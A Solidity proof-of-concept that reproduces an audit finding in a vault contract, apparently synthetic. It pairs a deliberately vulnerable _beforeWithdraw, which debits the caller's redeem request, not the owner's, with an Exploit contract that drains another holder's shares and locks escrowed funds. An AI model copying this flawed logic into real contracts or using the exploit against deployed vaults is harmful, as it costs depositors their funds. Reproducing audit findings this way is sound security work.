// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* Blueberry HyperEvmVault — _beforeWithdraw debits msg.sender, not the share owner
   (Pashov H-05, AuditVault 61458). SYNTHETIC, cheatcode-free.
   Address1 is approved for Address2 and withdraws Address2's shares against Address1's
   request. Address2's request stays open after its shares are burned, so 400 USDC in the
   deposit escrow cannot be paid and the remaining holder's full redeem reverts. */

contract Cash {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract Vault {
    struct Request {
        uint256 shares;
        uint256 assets;
    }

    Cash public usdc;
    uint256 public redeemEscrow = 2000 ether;
    uint256 public depositEscrow;
    uint256 public totalSupply = 2000 ether;
    uint256 public totalRedeemRequests;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => Request) public requests;

    constructor(Cash _usdc, address a1, address a2, address innocent) {
        usdc = _usdc;
        balanceOf[a1] = 400 ether;
        balanceOf[a2] = 400 ether;
        balanceOf[innocent] = 1200 ether;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function tvl() public view returns (uint256) {
        return redeemEscrow + depositEscrow;
    }

    function requestRedeem(uint256 shares_) external {
        require(shares_ <= balanceOf[msg.sender], "shares");
        Request storage request = requests[msg.sender];
        request.shares += shares_;
        require(request.shares <= balanceOf[msg.sender], "shares");
        uint256 assetsToRedeem = shares_ * tvl() / totalSupply;
        request.assets += assetsToRedeem;
        totalRedeemRequests += assetsToRedeem;
        redeemEscrow -= assetsToRedeem;
        depositEscrow += assetsToRedeem;
    }

    function withdraw(uint256 assets_, address receiver, address owner_) external {
        uint256 shares_ = assets_ * totalSupply / tvl();
        if (msg.sender != owner_) {
            uint256 allowed = allowance[owner_][msg.sender];
            require(allowed >= shares_, "allowance");
            if (allowed != type(uint256).max) allowance[owner_][msg.sender] = allowed - shares_;
        }
        _beforeWithdraw(assets_, shares_);
        balanceOf[owner_] -= shares_;
        totalSupply -= shares_;
        depositEscrow -= assets_;
        usdc.transfer(receiver, assets_);
    }

    function _beforeWithdraw(uint256 assets_, uint256 shares_) internal {
        Request storage request = requests[msg.sender]; // @> VULN: approved withdraw debits the caller and burns the owner's shares
        require(request.assets >= assets_, "assets");
        require(request.shares >= shares_, "shares");
        request.assets -= assets_;
        request.shares -= shares_;
        totalRedeemRequests -= assets_;
    }
}

contract User {
    function approve(Vault vault, address spender) external {
        vault.approve(spender, type(uint256).max);
    }

    function request(Vault vault, uint256 shares_) external {
        vault.requestRedeem(shares_);
    }

    function withdraw(Vault vault, uint256 assets_, address receiver, address owner_) external {
        vault.withdraw(assets_, receiver, owner_);
    }
}

contract Exploit {
    Cash public usdc; // nonce 1
    User public a1; // nonce 2
    User public a2; // nonce 3
    User public innocent; // nonce 4
    Vault public vault; // nonce 5
    bool public ownerWithdrawReverted;
    bool public innocentReverted;
    uint256 public a1Cash;
    uint256 public a2Shares;
    uint256 public a2RequestAssets;
    uint256 public depositLeft;

    constructor() {
        usdc = new Cash();
        a1 = new User();
        a2 = new User();
        innocent = new User();
        vault = new Vault(usdc, address(a1), address(a2), address(innocent));
        usdc.mint(address(vault), 2000 ether);
    }

    function run() external {
        a2.approve(vault, address(a1));
        a1.request(vault, 400 ether);
        a2.request(vault, 400 ether);
        a1.withdraw(vault, 400 ether, address(a1), address(a2));
        a1.request(vault, 400 ether);
        a1.withdraw(vault, 400 ether, address(a1), address(a1));

        try a2.withdraw(vault, 400 ether, address(a2), address(a2)) {
            ownerWithdrawReverted = false;
        } catch {
            ownerWithdrawReverted = true;
        }
        try innocent.request(vault, 1200 ether) {
            innocentReverted = false;
        } catch {
            innocentReverted = true;
        }

        a1Cash = usdc.balanceOf(address(a1));
        a2Shares = vault.balanceOf(address(a2));
        (, a2RequestAssets) = vault.requests(address(a2));
        depositLeft = vault.depositEscrow();
        require(a1Cash == 800 ether, "a1 cash");
        require(a2Shares == 0, "a2 shares");
        require(a2RequestAssets == 400 ether, "dead request");
        require(ownerWithdrawReverted, "a2 withdrew");
        require(innocentReverted, "innocent exited");
        require(depositLeft == 400 ether, "locked");
        require(vault.redeemEscrow() == 800 ether, "redeem");
        require(usdc.balanceOf(address(innocent)) == 0, "innocent paid");
    }
}
